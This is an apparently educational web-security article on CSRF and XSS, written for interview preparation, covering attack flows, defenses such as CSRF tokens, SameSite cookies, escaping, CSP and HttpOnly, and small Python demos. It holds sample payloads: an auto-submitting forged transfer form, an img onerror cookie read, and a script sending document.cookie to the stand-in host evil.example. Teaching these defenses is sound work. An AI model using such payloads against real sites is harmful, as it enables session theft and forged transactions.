---
title: "CSRF and XSS"
---

**CSRF is an attack that makes a logged-in user's browser send a request the attacker wants without the user knowing, and XSS is an attack where the attacker plants a malicious script in someone else's web page so that it runs in the browser of any user who opens that page.** Both are representative security vulnerabilities of web applications, so they often come up together in technical interviews.

## At a Glance

- **CSRF (Cross-Site Request Forgery)**: an attack where "a document in my name gets stamped with my seal without my knowledge." The bank (server) only checks whether the seal (cookie) is genuine, so it doesn't know who actually wrote the document.
- **XSS (Cross-Site Scripting)**: an attack where "someone pins a note on a bulletin board, and whoever reads the note follows the commands written on it exactly." The browser cannot tell whether a script is the site's own code or code the attacker inserted.
- In one line: **CSRF happens because the server trusts the browser too much**, and **XSS happens because the browser trusts the page content too much**.

> A note on the name: XSS is short for Cross-Site Scripting. X is used instead of C so it isn't confused with CSS (Cascading Style Sheets).

## CSRF (Cross-Site Request Forgery)

### Conditions for the Attack to Work

CSRF is not an attack that infects the user's computer or hacks the server. It works only when the following conditions are all met at the same time.

1. The user is **logged in** to the target site (e.g. a bank, social media). (A session cookie remains in the browser.)
2. In that state, the user opens a page, email, or link made by the attacker.
3. The target site processes requests "as long as the cookie is valid." It does not separately check whether the user really made the request themselves.

If auto-login is turned on, condition 1 is always met, so damage happens more often. A common real-life example is ad posts appearing on your social media account by themselves.

### Attack Flow

```
[User]                       [Attacker page]                  [bank.example server]
   │ 1. Log in to bank.example ───────────────────────────────▶ │
   │ ◀──────────────────────────────── 2. Session cookie issued │
   │                                                            │
   │ 3. Visit attacker page ──▶ │                               │
   │                          │ Hidden form auto-submits         │
   │                          │ POST /transfer (to=attacker)     │
   │ 4. Browser automatically attaches the bank.example cookie ▶ │
   │                                                            │ 5. The cookie is valid,
   │                                                            │    so the transfer is processed
```

The key is step 4. No matter which page sent the request, the browser **automatically attaches the destination site's cookie**. From the server's point of view, a normal request and a forged request look exactly the same. (How cookies work is covered in detail in the [Cookies and Sessions](/en/web/knowledge/05-쿠키와-세션) article.)

The code that goes into the attacker's page is as simple as this.

```html
<!-- Attacker page: sends a transfer request to bank.example as soon as it opens -->
<form action="https://bank.example/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.getElementById('f').submit()</script>
```

Features that change state with a GET request (e.g. `GET /delete?id=3`) are even more dangerous, because a single image tag (`<img src="...">`) is enough to send the request. That is why **requests that change data should use methods like POST, PUT, or DELETE, not GET**. (See [HTTP Request Methods](/en/web/knowledge/02-http-요청-메서드).)

### How to Defend Against CSRF

| Method | Principle | Watch out for |
| --- | --- | --- |
| CSRF token | The server puts an unguessable random value in every form and checks that the request contains it | The attacker's page cannot read this value, so it cannot include it in the forged request |
| SameSite cookie | Set `SameSite=Lax` or `Strict` on the cookie so it is not attached to requests that start from other sites | Major browsers now treat cookies without it as `Lax`, but setting it explicitly is safer |
| Origin / Referer check | Check that the request header `Origin` (or `Referer` if absent) is our site's address | The headers sometimes arrive empty, so use it as a supplement rather than on its own |
| Re-confirm important actions | Ask for the password or OTP again before a transfer or password change | It hurts usability, so apply it only to truly important features |

The differences between `SameSite` values are as follows.

| Value | Is the cookie attached to requests coming from other sites? |
| --- | --- |
| `Strict` | Never. Even when arriving via an external link, you look logged out at first |
| `Lax` | Attached only for top-level GET navigation like clicking a link. Not attached to POST forms sent from other sites |
| `None` | Always attached. Must be used together with `Secure` (HTTPS only) |

> CSRF tokens are also weak against XSS. If the attacker's script runs inside our page, it can read the token in the page and put it straight into a request. So XSS must be blocked first for CSRF defenses to mean anything.

## XSS (Cross-Site Scripting)

### Attack Flow (Stored Example)

```
[Attacker] ── 1. Writes a script in a comment ──▶ [Board server] ── 2. Saved as is in the DB
                                              │
[Victim] ── 3. Opens the post ──────────────▶ │
         ◀── 4. HTML response with the comment │
   │
   │ 5. The browser treats the script in the comment as "this site's code" and runs it
   ▼
   Cookie theft, screen manipulation, sending requests behind the user's back, etc.
```

The image below draws the same flow as a cookie-theft example. The attacker puts a script in a comment (1), the victim opens the comment (2, 3), and the victim's browser runs the script and sends the cookie to the attacker's server (4).

![Stored XSS: a comment script planted by the attacker runs in the victim's browser and the cookie is sent to the attacker's server](/images/web/csrf-xss-stored-xss.png)

*Image source: [Wikimedia Commons](https://commons.wikimedia.org/wiki/File:Cross-Site_Scripting_%28XSS%29.png) (CC BY-SA 4.0)*

From the browser's point of view, this script is indistinguishable from code served by the legitimate site, so it runs **with that site's privileges**. If it reads the cookie and sends it to the attacker's server, the attacker can log in to the victim's account with that session ID. This is called **session hijacking**.

### Three Kinds of XSS

| Kind | Where the script lives | How it spreads | Example |
| --- | --- | --- | --- |
| Stored (Persistent) | The server's DB | Runs for every user who opens that post | Board comments, profile bios |
| Reflected | Request values such as the URL | The server echoes the request value back in the response HTML as is. The attacker lures victims into clicking a link | A search results page with a script after `search?q=` |
| DOM-based | Inside the browser, such as the part of the URL after `#` | Doesn't go through the server; runs when the page's JavaScript puts that value on screen | Code that puts the `location.hash` value into `innerHTML` |

With DOM-based XSS, the malicious value often does not appear in server logs (e.g. the part after `#` is not sent to the server), so it is **hard to detect on the server side.** This attack is related to how the browser turns HTML into the DOM, so it is worth reading [How Browsers Work](/en/web/knowledge/01-브라우저-동작-원리) as well.

### How to Defend Against XSS

| Method | Description |
| --- | --- |
| Escape on output | Right before putting user input into HTML, convert characters like `<` to `&lt;` so they show only as "text." The most basic and most important defense |
| `textContent` instead of `innerHTML` | `innerHTML` interprets the string as HTML, while `textContent` inserts it as plain text. Always use `textContent` for user input |
| Sanitize if allowing HTML is truly needed | When you must allow things like bold and links, as in a board editor, use a proven library like DOMPurify to remove tags and attributes not on the allowlist |
| CSP (Content Security Policy) | A response header that tells the browser "this page only runs scripts from our domain." A second line of defense that blocks execution even if a script is planted |
| HttpOnly cookie | With `HttpOnly` on a cookie, JavaScript (`document.cookie`) cannot read it. Even if XSS breaks out, it prevents session cookie theft |
| Use framework defaults | Vue and React escape values by default when putting them on screen. Use features that turn off this protection, like Vue's `v-html` or React's `dangerouslySetInnerHTML`, only when truly necessary |

Here is the difference between `innerHTML` and `textContent` in code.

```js
const comment = '<img src=x onerror="alert(document.cookie)">'

// Dangerous: interprets the string as HTML. An img tag is created and the onerror script runs
commentBox.innerHTML = comment

// Safe: inserts the string as literal text. Tag-shaped text appears on screen but nothing runs
commentBox.textContent = comment
```

A CSP header is set like this.

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
```

> Trying to block attacks only by filtering input (a blocklist) is not recommended, because it is easy to bypass. Even if you remove the word `script`, there are many other ways to run scripts, such as `onerror` and `javascript:` links. The principle is to **validate input, and escape output to fit where it goes (HTML body, attribute, URL, inside JavaScript)**.

### Client-Side Checks Alone Cannot Stop It

Checking input in the browser, as in the [Form Validation](/en/web/features/05-폼-유효성-검사) article, is a **usability** feature that gives users quick feedback. Attackers can skip the browser and send requests straight to the server with tools like `curl`, so client-side checks cannot be a security measure. Validation and escaping for security **must also be done on the server**.

### Are CORS and SOP Defenses Against XSS?

The browser's **SOP (Same-Origin Policy)** is the basic rule that stops JavaScript from freely reading responses from other origins, and **CORS** is the mechanism by which a server relaxes that rule by saying "this origin is allowed to read." Neither directly prevents XSS, because the moment the attacker's script runs inside our page, that script is already "the same origin." Blocking scripts from being loaded from outside is the job of **CSP**, not CORS.

## Getting a Feel with Code: Escaping and CSRF Tokens

### An Escape Function

Suppose a user left a comment with a script that steals cookies. Let's check with Python how the HTML differs before and after escaping.

```python
def escape_html(text):
    # & must be replaced first, so already-converted text like &lt; doesn't get broken again
    table = {"&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#x27;"}
    return "".join(table.get(ch, ch) for ch in text)

comment = '<script>fetch("https://evil.example/?c=" + document.cookie)</script>'

unsafe = "<li>" + comment + "</li>"
safe = "<li>" + escape_html(comment) + "</li>"

print("[Before escaping]", unsafe)
print("[After escaping]", safe)
```

Output:

```
[Before escaping] <li><script>fetch("https://evil.example/?c=" + document.cookie)</script></li>
[After escaping] <li>&lt;script&gt;fetch(&quot;https://evil.example/?c=&quot; + document.cookie)&lt;/script&gt;</li>
```

When the browser receives the HTML before escaping, it interprets it as a `script` tag and runs it. The HTML after escaping appears on the browser screen only as tag-shaped **text** and does not run. In real services, rather than writing this yourself, you use Python's `html.escape()` or the template engine's auto-escaping feature.

### Checking a CSRF Token

This is the flow where the server stores a random token in the session and processes the request only when it contains the same value.

```python
import secrets, hmac

session = {}  # think of this as the session store the server keeps per user

def issue_token():
    session["csrf_token"] = secrets.token_hex(16)
    return session["csrf_token"]

def handle_transfer(form):
    sent = form.get("csrf_token", "")
    if not hmac.compare_digest(sent, session.get("csrf_token", "")):
        return "403 Rejected: CSRF token does not match"
    return f"200 Done: sent {form['amount']} won to {form['to']}"

token = issue_token()
print("Issued token length:", len(token))
print("Normal form    ->", handle_transfer({"to": "friend", "amount": 10000, "csrf_token": token}))
print("Forged request ->", handle_transfer({"to": "attacker", "amount": 1000000}))
print("Guessed token  ->", handle_transfer({"to": "attacker", "amount": 1000000, "csrf_token": "1234"}))
```

Output:

```
Issued token length: 32
Normal form    -> 200 Done: sent 10000 won to friend
Forged request -> 403 Rejected: CSRF token does not match
Guessed token  -> 403 Rejected: CSRF token does not match
```

- The attacker's page cannot read our site's HTML, so it cannot know the token value. That is why a forged request has either no token or a wrong value.
- The token is made with the unguessable `secrets` module, not `random`, and compared with `hmac.compare_digest()` instead of `==`. This is to prevent an attack that figures out the value one character at a time from how long the comparison takes (a timing attack).

## CSRF vs XSS

| Aspect | CSRF | XSS |
| --- | --- | --- |
| What the attacker exploits | The server trusting a request based only on the cookie | The browser trusting scripts inside the page |
| Where the malicious code runs | The attacker's page (it only sends the request to the target site) | Inside the target site's page (the victim's browser) |
| What the attacker can do | Send a predetermined request (cannot see the response) | Almost anything possible within the page (read the screen, steal cookies, send requests) |
| Login required? | The victim must be logged in to the target site | Not necessarily (the damage is bigger if logged in) |
| Typical defenses | CSRF token, SameSite cookie, Origin check | Output escaping, `textContent`, CSP, HttpOnly cookie |
| Relationship | If XSS breaks through, CSRF tokens are neutralized too | XSS can be used to carry out a CSRF attack |

## Interview Questions

**Q. What is the difference between CSRF and XSS?**
CSRF is an attack that uses the user's logged-in state to make them send a forged request to the server, while XSS is an attack that plants a script in a web page so it runs in the user's browser. CSRF exploits the server's trust in requests, and XSS exploits the browser's trust in page content.

**Q. How do you prevent CSRF?**
Put an unguessable CSRF token in every request and check it on the server, and set `SameSite=Lax` or stricter on the session cookie. As supplements, check the `Origin` header and never use GET for requests that change data.

**Q. How do you prevent XSS?**
The basic step is to escape user input to fit its output location when putting it on screen. In JavaScript, use `textContent` instead of `innerHTML`, use a CSP header so only allowed scripts run, and put `HttpOnly` on the session cookie to prevent theft.

**Q. Does adding HttpOnly prevent XSS?**
No. It only stops JavaScript from reading the cookie; it does not stop the script from running. The attacker can send requests directly from the victim's browser without stealing the cookie, so escaping and CSP are also needed.

**Q. If you use JWT, do you not need to worry about CSRF?**
It depends on where the token is stored. If you put it directly in the `Authorization` header, the browser doesn't attach it automatically, so it is strong against CSRF, but if you keep it in `localStorage`, it can be stolen through XSS. If you put it in a cookie, you need CSRF defenses again. For details, see the [JWT](/en/web/knowledge/07-jwt) article.

## Summary

- **CSRF**: an attack that exploits the fact that a logged-in user's browser attaches cookies automatically, making it send a request the user did not intend. It is prevented with CSRF tokens, SameSite cookies, and Origin checks.
- **XSS**: an attack where a script planted in a page runs with that site's privileges. There are three kinds (stored, reflected, DOM-based), and it is prevented with output escaping, `textContent`, CSP, and HttpOnly cookies.
- Client-side input checks are just a usability feature; security validation must also be done on the server.
- If XSS breaks through, CSRF defenses collapse too, so of the two, XSS defense comes first.
